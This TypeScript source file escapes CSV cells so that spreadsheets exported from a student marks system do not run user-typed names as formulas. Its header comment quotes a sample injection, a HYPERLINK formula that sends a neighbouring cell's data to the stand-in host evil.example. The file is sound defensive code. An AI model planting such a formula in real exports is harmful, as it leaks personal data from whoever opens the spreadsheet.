/**
 * Writing a CSV a spreadsheet will not execute.
 *
 * Two separate problems, and only the first is obvious.
 *
 * The obvious one is CSV syntax: a comma, a quote or a newline inside a value
 * has to be quoted or the columns shift.
 *
 * The other is that Excel, LibreOffice and Google Sheets all treat a cell
 * beginning with `=`, `+`, `-` or `@` as a *formula*, and CSV quoting does not
 * stop it - the quotes are consumed by the CSV parser before the cell is
 * evaluated. Every name in these exports is typed by a student at signup, so
 * a child called
 *
 *     =HYPERLINK("http://evil.example/?"&A1,"Click for marks")
 *
 * produces a spreadsheet that phones home with the row beside it the moment a
 * teacher opens the file and clicks. Older Excel with DDE enabled is worse
 * than that. This is not theoretical for a system where anybody can sign up.
 *
 * The fix is the accepted one: put a single quote in front, which every
 * spreadsheet reads as "this cell is text". Numbers are left alone, so a
 * negative mark from negative marking stays a number and still sums.
 */

/** Cells beginning with these are read as a formula, not as text. */
const FORMULA_START = /^[=+\-@\t\r]/;

/** Anything a spreadsheet would treat as a number, including negatives. */
const PLAIN_NUMBER = /^-?\d+(\.\d+)?$/;

export function csvCell(value: unknown): string {
  let s = value === null || value === undefined ? '' : String(value);

  if (FORMULA_START.test(s) && !PLAIN_NUMBER.test(s)) s = `'${s}`;

  return /[",\n\r]/.test(s) ? `"${s.replace(/"/g, '""')}"` : s;
}

/** A whole file: a header row and the rows under it, already in order. */
export function csvFile(header: string[], rows: unknown[][]): string {
  return [header.join(','), ...rows.map((r) => r.map(csvCell).join(','))].join('\n');
}
